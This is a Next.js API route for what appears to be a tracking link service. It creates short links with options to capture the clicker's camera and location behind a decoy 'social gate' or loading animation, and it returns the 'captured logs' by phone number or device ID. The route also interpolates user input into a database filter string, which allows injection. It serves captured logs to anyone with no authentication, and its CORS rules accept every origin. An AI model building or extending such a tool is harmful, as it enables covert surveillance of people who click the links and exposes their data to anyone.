import { NextResponse } from 'next/server';
import { supabase } from '../../../lib/supabase';

export async function OPTIONS() {
  const response = NextResponse.json({}, { status: 200 });
  response.headers.set('Access-Control-Allow-Origin', '*');
  response.headers.set('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  return response;
}

function getOriginAndDomain(req: Request) {
  const host = req.headers.get('x-forwarded-host') || req.headers.get('host') || 'localhost:3001';
  let proto = req.headers.get('x-forwarded-proto');
  if (!proto) {
    proto = host.startsWith('localhost') || host.startsWith('127.0.0.1') ? 'http' : 'https';
  }
  return {
    origin: `${proto}://${host}`,
    domain: host.split(':')[0],
  };
}

export async function POST(req: Request) {
  try {
    const { origin, domain } = getOriginAndDomain(req);
    const body = await req.json();
    const {
      longUrl,
      customAlias,
      phoneNumber,
      captureCamera,
      captureLocation,
      socialGateTitle,
      socialGateUrl,
      socialGateDesc,
      socialGateBtnText,
      socialGateIcon,
      animationType,
      animationText,
      password,
      expirationDate,
      deviceId,
    } = body;

    if (!longUrl) {
      return NextResponse.json(
        { error: 'longUrl is required' },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    if (!deviceId && !phoneNumber) {
      return NextResponse.json(
        { error: 'Phone number is mandatory when Device ID is not available (e.g. API/Bot usage).' },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Determine short code
    let shortCode = customAlias;
    if (!shortCode) {
      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      shortCode = '';
      for (let i = 0; i < 7; i++) {
        shortCode += chars.charAt(Math.floor(Math.random() * chars.length));
      }
    }

    // Insert into Supabase
    const { data, error } = await supabase
      .from('urls')
      .insert([
        {
          domain,
          short_code: shortCode,
          long_url: longUrl,
          password: password || null,
          social_gate_title: socialGateTitle || null,
          social_gate_url: socialGateUrl || null,
          social_gate_description: socialGateDesc || null,
          social_gate_button_text: socialGateBtnText || null,
          social_gate_icon: socialGateIcon || null,
          animation_type: animationType || 'ring',
          animation_text: animationText || 'LOADING',
          capture_camera: !!captureCamera,
          capture_location: !!captureLocation,
          expires_at: expirationDate ? new Date(expirationDate).toISOString() : null,
          device_id: deviceId || 'api-generated',
          phone_number: phoneNumber || null,
        },
      ])
      .select()
      .single();

    if (error) {
      if (error.code === '23505') {
        return NextResponse.json(
          { error: 'Custom alias is already in use for this domain.' },
          {
            status: 409,
            headers: { 'Access-Control-Allow-Origin': '*' },
          }
        );
      }
      console.error('Supabase Error:', error);
      return NextResponse.json(
        { error: error.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    const generatedUrl = `${origin}/${shortCode}`;

    return NextResponse.json(
      {
        success: true,
        shortUrl: generatedUrl,
        data: data,
      },
      {
        status: 201,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  } catch (err) {
    console.error('Internal API Error:', err);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      {
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  }
}

export async function GET(req: Request) {
  try {
    const { origin } = getOriginAndDomain(req);
    const { searchParams } = new URL(req.url);
    const phoneNumber = searchParams.get('phoneNumber');
    const deviceId = searchParams.get('deviceId');
    const shortCode = searchParams.get('shortCode');

    if (!phoneNumber && !deviceId && !shortCode) {
      return NextResponse.json(
        {
          error: 'Provide phoneNumber, deviceId, or shortCode to fetch latest captured logs.',
        },
        {
          status: 400,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Step 1: Find matching URLs
    let urlQuery = supabase.from('urls').select('id, short_code, long_url');

    if (shortCode) {
      urlQuery = urlQuery.eq('short_code', shortCode);
    } else if (phoneNumber && deviceId) {
      urlQuery = urlQuery.or(`device_id.eq.${deviceId},phone_number.eq.${phoneNumber}`);
    } else if (phoneNumber) {
      urlQuery = urlQuery.eq('phone_number', phoneNumber);
    } else if (deviceId) {
      urlQuery = urlQuery.eq('device_id', deviceId);
    }

    const { data: urls, error: urlsError } = await urlQuery;

    if (urlsError) {
      return NextResponse.json(
        { error: urlsError.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    if (!urls || urls.length === 0) {
      return NextResponse.json(
        {
          success: true,
          message: 'No links found for this identity.',
          latestClick: null,
          logs: [],
        },
        {
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    const urlIds = urls.map((u) => u.id);
    const urlIdToShortCode = urls.reduce((acc, curr) => {
      acc[curr.id] = curr.short_code;
      return acc;
    }, {} as Record<string, string>);

    // Step 2: Fetch captured link analytics
    const { data: analytics, error: analyticsError } = await supabase
      .from('link_analytics')
      .select('*')
      .in('url_id', urlIds)
      .order('created_at', { ascending: false });

    if (analyticsError) {
      return NextResponse.json(
        { error: analyticsError.message },
        {
          status: 500,
          headers: { 'Access-Control-Allow-Origin': '*' },
        }
      );
    }

    // Map short_code back to each log
    const detailedLogs = (analytics || []).map((log) => ({
      ...log,
      short_code: urlIdToShortCode[log.url_id] || null,
      shortUrl: urlIdToShortCode[log.url_id] ? `${origin}/${urlIdToShortCode[log.url_id]}` : null,
    }));

    const latestClick = detailedLogs.length > 0 ? detailedLogs[0] : null;

    return NextResponse.json(
      {
        success: true,
        latestClick,
        totalClicks: detailedLogs.length,
        logs: detailedLogs,
      },
      {
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  } catch (err: any) {
    console.error('API Error:', err);
    return NextResponse.json(
      { error: 'Internal Server Error' },
      {
        status: 500,
        headers: { 'Access-Control-Allow-Origin': '*' },
      }
    );
  }
}
